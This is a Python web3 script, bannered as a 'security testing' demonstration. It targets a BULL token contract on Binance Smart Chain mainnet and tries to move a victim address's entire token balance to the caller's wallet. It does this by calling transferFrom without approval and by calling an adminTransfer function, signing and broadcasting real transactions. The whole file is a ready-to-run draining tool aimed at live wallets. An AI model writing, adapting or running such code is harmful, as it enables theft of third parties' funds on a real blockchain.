from web3 import Web3
import argparse
import getpass
import time
from web3.middleware import geth_poa_middleware

def main():
    # Setup argument parser
    parser = argparse.ArgumentParser(description='Token Vulnerability Demo')
    parser.add_argument('--rpc', default="https://bsc-dataseed.binance.org/", help='BSC RPC endpoint')
    parser.add_argument('--token', required=True, help='Token contract address')
    parser.add_argument('--from-address', required=True, help='Source wallet address')
    parser.add_argument('--to-address', required=True, help='Destination wallet address')
    args = parser.parse_args()

    # Initialize Web3 with POA middleware for BSC
    w3 = Web3(Web3.HTTPProvider(args.rpc))
    w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    if not w3.isConnected():
        print("❌ Failed to connect to blockchain")
        return

    # Token ABI (with admin functions)
    token_abi = [
        {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"adminTransfer","outputs":[],"type":"function"}
    ]
    token = w3.eth.contract(address=args.token, abi=token_abi)

    # Securely get private key
    private_key = getpass.getpass("Enter your private key (must control to-address): ")
    account = w3.eth.account.from_key(private_key)
    
    if account.address.lower() != args.to_address.lower():
        print("❌ Error: Private key doesn't match destination address")
        return

    try:
        # Check balances before
        print("\n[Initial Balances]")
        from_balance = token.functions.balanceOf(args.from_address).call()
        to_balance = token.functions.balanceOf(args.to_address).call()
        print(f"From: {from_balance / 10**8} BULL")
        print(f"To: {to_balance / 10**8} BULL")

        # Method 1: transferFrom without approval
        print("\n[Attempting transferFrom without approval]")
        try:
            nonce = w3.eth.get_transaction_count(args.to_address)
            tx = token.functions.transferFrom(
                args.from_address,
                args.to_address,
                from_balance
            ).build_transaction({
                'from': args.to_address,
                'gas': 200000,
                'gasPrice': w3.eth.gas_price,
                'nonce': nonce
            })
            
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            print(f"✓ TX broadcasted: {tx_hash.hex()}")
            
            # Wait for receipt and check status
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            if receipt.status == 1:
                print("✅ TX succeeded on-chain!")
            else:
                print("❌ TX reverted on-chain (check BscScan)")
            
        except Exception as e:
            print(f"❌ transferFrom failed: {str(e)}")

        # Add delay to avoid nonce conflicts
        time.sleep(5)

        # Method 2: adminTransfer
        print("\n[Attempting adminTransfer]")
        try:
            nonce = w3.eth.get_transaction_count(args.to_address)
            tx = token.functions.adminTransfer(
                args.from_address,
                args.to_address,
                from_balance
            ).build_transaction({
                'from': args.to_address,
                'gas': 200000,
                'gasPrice': w3.eth.gas_price,
                'nonce': nonce
            })
            
            signed = account.sign_transaction(tx)
            tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
            print(f"✓ TX broadcasted: {tx_hash.hex()}")
            
            # Check on-chain status
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
            if receipt.status == 1:
                print("✅ adminTransfer succeeded!")
            else:
                print("❌ adminTransfer reverted (check BscScan)")
            
        except Exception as e:
            print(f"❌ adminTransfer failed: {str(e)}")

        # Verify final balances
        print("\n[Final Balances]")
        print(f"From: {token.functions.balanceOf(args.from_address).call() / 10**8} BULL")
        print(f"To: {token.functions.balanceOf(args.to_address).call() / 10**8} BULL")

    except Exception as e:
        print(f"\n❌ Critical error: {str(e)}")

if __name__ == "__main__":
    print("""
    ***************************************
    * Token Vulnerability Demonstration   *
    * For Security Testing Purposes Only  *
    ***************************************
    """)
    main()
